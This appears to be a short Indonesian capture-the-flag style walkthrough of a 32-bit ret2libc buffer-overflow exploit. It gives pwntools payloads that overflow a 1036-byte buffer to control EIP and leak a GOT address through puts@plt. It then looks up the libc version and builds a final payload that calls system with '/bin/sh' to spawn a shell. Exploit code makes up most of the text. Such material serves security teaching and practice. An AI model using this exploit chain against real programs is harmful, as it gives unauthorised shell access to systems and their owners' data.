1. Leak got dengan control EIP untuk `puts@plt`.Disini kita bisa buffer dengan `1036` bytes 
```py
    p=b"A"*1036
    p+=p32(exe.plt["puts"])
    p+=p32(exe.sym["main"])
    p+=p32(exe.got[func_name]) #argument
```
3. Lalu kita bisa pergi ke libc.database untuk mencari libc yang tepat
4. Gunakan address libc yang tepat dengan dikurangi  leaked address

5. Setelah semua kita dapatkan kita bisa membuat payload seperti ini
```py
    BINSH=next(libc.search(b"/bin/sh"))
    SYSTEM=libc.sym["system"]
    p=b"A"*1036 # buffer
    p+=p32(SYSTEM) #target function
    p+=p32(exe.sym["main"]) # balik ke ke main
    p+=p32(BINSH) #string argument
``` 
Karena disini menggunakan arsitektur 32-bits maka tidak perlu gadget untuk passing argument